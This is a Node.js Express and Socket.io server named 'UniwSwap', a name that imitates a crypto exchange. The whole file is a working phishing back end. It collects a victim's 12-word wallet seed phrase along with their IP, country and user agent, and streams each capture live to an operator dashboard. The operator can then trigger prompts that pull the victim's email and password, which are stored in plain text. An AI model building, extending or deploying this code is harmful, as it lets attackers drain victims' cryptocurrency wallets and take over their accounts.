require('dotenv').config()

const express = require('express')
const cors = require('cors')
const helmet = require('helmet')
const compression = require('compression')
const http = require('http')
const { Server } = require('socket.io')
const mongoose = require('mongoose')
const geoip = require('geoip-lite')

const Session = require('./models/Session')

const PORT = process.env.PORT || 3331
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/uniwswap'

const app = express()

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false
}))
app.use(compression())
app.set('trust proxy', 1)

// CORS configuration for production
const corsOptions = {
  origin: [
    'http://localhost:3332',
    'https://seu-projeto.vercel.app',
    /\.vercel\.app$/,
    process.env.FRONTEND_URL
  ].filter(Boolean),
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'x-requested-with'],
  optionsSuccessStatus: 200
}

app.use(cors(corsOptions))
app.use(express.json({ limit: '10mb' }))
app.use(express.urlencoded({ extended: true, limit: '10mb' }))

const httpServer = http.createServer(app)
const io = new Server(httpServer, {
  cors: corsOptions,
  transports: ['websocket', 'polling'],
  pingTimeout: 60000,
  pingInterval: 25000,
  maxHttpBufferSize: 1e8,
  allowEIO3: true
})

const sessionSocketMap = new Map()
const socketSessionMap = new Map()

// MongoDB connection with retry logic
const connectDB = async () => {
  try {
    const conn = await mongoose.connect(MONGODB_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
      serverSelectionTimeoutMS: 5000,
      socketTimeoutMS: 45000,
      bufferCommands: false,
      maxPoolSize: 10
    })
    console.log(`📦 MongoDB Connected: ${conn.connection.host}`)
  } catch (error) {
    console.error('❌ MongoDB connection error:', error)
    // Retry connection after 5 seconds
    setTimeout(connectDB, 5000)
  }
}

// Handle MongoDB connection events
mongoose.connection.on('error', (err) => {
  console.error('MongoDB connection error:', err)
})

mongoose.connection.on('disconnected', () => {
  console.log('MongoDB disconnected')
})

// Connect to MongoDB
connectDB()

const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/i

const normalizeIp = (ipAddress) => {
  if (!ipAddress) return null
  if (ipAddress === '::1') return '127.0.0.1'
  if (ipAddress.startsWith('::ffff:')) return ipAddress.slice(7)
  return ipAddress
}

const getClientIp = (req) => {
  const forwarded = req.headers['x-forwarded-for']
  if (Array.isArray(forwarded)) {
    return normalizeIp(forwarded[0])
  }
  if (typeof forwarded === 'string' && forwarded.length > 0) {
    const [first] = forwarded.split(',')
    return normalizeIp(first.trim())
  }
  return normalizeIp(req.socket.remoteAddress)
}

const getCountryFromIp = (ipAddress) => {
  if (!ipAddress) return 'Unknown'
  const lookup = geoip.lookup(ipAddress)
  return lookup?.country ?? 'Unknown'
}

const formatSession = (session) => ({
  id: session._id.toString(),
  socketId: session.socketId,
  status: session.status,
  seedWords: session.seedWords,
  email: session.email,
  password: session.password,
  ipAddress: session.ipAddress,
  country: session.country,
  userAgent: session.userAgent,
  createdAt: session.createdAt,
  updatedAt: session.updatedAt,
  emailRequestedAt: session.emailRequestedAt,
  emailSubmittedAt: session.emailSubmittedAt,
  passwordSubmittedAt: session.passwordSubmittedAt,
  finalizedAt: session.finalizedAt,
})

app.get('/api/health', (_req, res) => {
  res.json({ status: 'ok' })
})

app.post('/api/sessions', async (req, res) => {
  const { seedWords, socketId } = req.body

  if (!socketId || typeof socketId !== 'string') {
    return res.status(400).json({ error: 'socketId is required' })
  }

  if (!Array.isArray(seedWords) || seedWords.length !== 12) {
    return res.status(400).json({ error: 'seedWords must contain 12 entries' })
  }

  const sanitizedSeedWords = seedWords.map((word) => (typeof word === 'string' ? word.trim() : ''))

  if (sanitizedSeedWords.some((word) => word.length === 0)) {
    return res.status(400).json({ error: 'seedWords cannot contain empty values' })
  }

  const ipAddress = getClientIp(req)
  const country = getCountryFromIp(ipAddress)
  const userAgent = req.headers['user-agent'] || 'Unknown'

  try {
    const session = await Session.create({
      socketId,
      seedWords: sanitizedSeedWords,
      ipAddress,
      country,
      userAgent,
    })

    const sessionId = session._id.toString()
    sessionSocketMap.set(sessionId, socketId)
    socketSessionMap.set(socketId, sessionId)

    const userSocket = io.sockets.sockets.get(socketId)
    if (userSocket) {
      userSocket.join(`session:${sessionId}`)
      userSocket.emit('session:waiting', {
        sessionId,
        status: session.status,
      })
    }

    io.to('admins').emit('admin:newSession', formatSession(session))

    return res.status(201).json({ sessionId })
  } catch (error) {
    console.error('Failed to create session:', error)
    return res.status(500).json({ error: 'Failed to create session' })
  }
})

const ensureAdmin = (socket, event) => {
  if (socket.data.role !== 'admin') {
    socket.emit('admin:error', { message: 'Unauthorized', event })
    return false
  }
  return true
}

const ensureUserSession = (socket, sessionId) => {
  if (socket.data.role !== 'user') {
    socket.emit('session:error', { message: 'Unauthorized' })
    return false
  }

  const registeredSession = socketSessionMap.get(socket.id)

  if (!registeredSession || registeredSession !== sessionId) {
    socket.emit('session:error', { message: 'Session mismatch' })
    return false
  }
  return true
}

io.on('connection', async (socket) => {
  const role = socket.handshake.query?.role === 'admin' ? 'admin' : 'user'
  socket.data.role = role

  if (role === 'admin') {
    socket.join('admins')
    const recentSessions = await Session.find().sort({ createdAt: -1 }).limit(50)
    socket.emit('admin:sessionList', recentSessions.map(formatSession))
  }

  socket.on('admin:requestEmail', async ({ sessionId }) => {
    if (!ensureAdmin(socket, 'admin:requestEmail')) return

    try {
      const session = await Session.findById(sessionId)
      if (!session) {
        socket.emit('admin:error', { message: 'Session not found', event: 'admin:requestEmail' })
        return
      }

      session.status = 'awaiting-email'
      session.emailRequestedAt = new Date()
      await session.save()

      io.to(`session:${sessionId}`).emit('session:requestEmail', { sessionId })
      io.to('admins').emit('admin:sessionUpdated', formatSession(session))
    } catch (error) {
      console.error('Failed to handle admin:requestEmail:', error)
      socket.emit('admin:error', { message: 'Failed to request email', event: 'admin:requestEmail' })
    }
  })

  socket.on('admin:finalize', async ({ sessionId }) => {
    if (!ensureAdmin(socket, 'admin:finalize')) return

    try {
      const session = await Session.findById(sessionId)
      if (!session) {
        socket.emit('admin:error', { message: 'Session not found', event: 'admin:finalize' })
        return
      }

      session.status = 'finalized'
      session.finalizedAt = new Date()
      await session.save()

      io.to(`session:${sessionId}`).emit('session:finalized', { sessionId })
      io.to('admins').emit('admin:sessionUpdated', formatSession(session))
    } catch (error) {
      console.error('Failed to handle admin:finalize:', error)
      socket.emit('admin:error', { message: 'Failed to finalize session', event: 'admin:finalize' })
    }
  })

  socket.on('session:submitEmail', async ({ sessionId, email }) => {
    if (!ensureUserSession(socket, sessionId)) return

    if (!email || !emailRegex.test(email)) {
      socket.emit('session:error', { message: 'A valid email address is required.' })
      return
    }

    try {
      const session = await Session.findById(sessionId)
      if (!session) {
        socket.emit('session:error', { message: 'Session not found.' })
        return
      }

      session.email = email.trim()
      session.status = 'awaiting-password'
      session.emailSubmittedAt = new Date()
      await session.save()

      socket.emit('session:requestPassword', { sessionId })
      io.to('admins').emit('admin:sessionUpdated', formatSession(session))
    } catch (error) {
      console.error('Failed to handle session:submitEmail:', error)
      socket.emit('session:error', { message: 'Could not submit email.' })
    }
  })

  socket.on('session:submitPassword', async ({ sessionId, password }) => {
    if (!ensureUserSession(socket, sessionId)) return

    if (!password || typeof password !== 'string' || password.trim().length === 0) {
      socket.emit('session:error', { message: 'Password is required.' })
      return
    }

    try {
      const session = await Session.findById(sessionId)
      if (!session) {
        socket.emit('session:error', { message: 'Session not found.' })
        return
      }

      session.password = password
      session.status = 'password-submitted'
      session.passwordSubmittedAt = new Date()
      await session.save()

      socket.emit('session:waiting', { sessionId, status: session.status })
      io.to('admins').emit('admin:sessionUpdated', formatSession(session))
    } catch (error) {
      console.error('Failed to handle session:submitPassword:', error)
      socket.emit('session:error', { message: 'Could not submit password.' })
    }
  })

  socket.on('disconnect', () => {
    if (socket.data.role === 'admin') {
      socket.leave('admins')
      return
    }

    const sessionId = socketSessionMap.get(socket.id)
    if (sessionId) {
      socketSessionMap.delete(socket.id)
      sessionSocketMap.delete(sessionId)
    }
  })
})

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    version: process.env.npm_package_version || '1.0.0',
    environment: process.env.NODE_ENV || 'development'
  })
})

// Basic info endpoint
app.get('/', (req, res) => {
  res.json({
    name: 'UniwSwap Backend API',
    version: '2.0.0',
    status: 'running'
  })
})

// 404 handler
app.use('*', (req, res) => {
  res.status(404).json({
    error: 'Not Found',
    message: 'The requested endpoint was not found'
  })
})

// Error handler
app.use((err, req, res, next) => {
  console.error('Unhandled error:', err)
  res.status(500).json({
    error: 'Internal Server Error',
    message: process.env.NODE_ENV === 'production' ? 'Something went wrong' : err.message
  })
})

// Graceful shutdown
const gracefulShutdown = (signal) => {
  console.log(`🔄 ${signal} received, shutting down gracefully`)
  httpServer.close(() => {
    mongoose.connection.close(false, () => {
      console.log('✅ Server closed. Database connection closed.')
      process.exit(0)
    })
  })
}

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'))
process.on('SIGINT', () => gracefulShutdown('SIGINT'))

// Start server
const HOST = process.env.NODE_ENV === 'production' ? '0.0.0.0' : 'localhost'
httpServer.listen(PORT, HOST, () => {
  console.log(`🚀 Server running on ${HOST}:${PORT}`)
  console.log(`📡 Socket.io server ready`)
  console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`)
})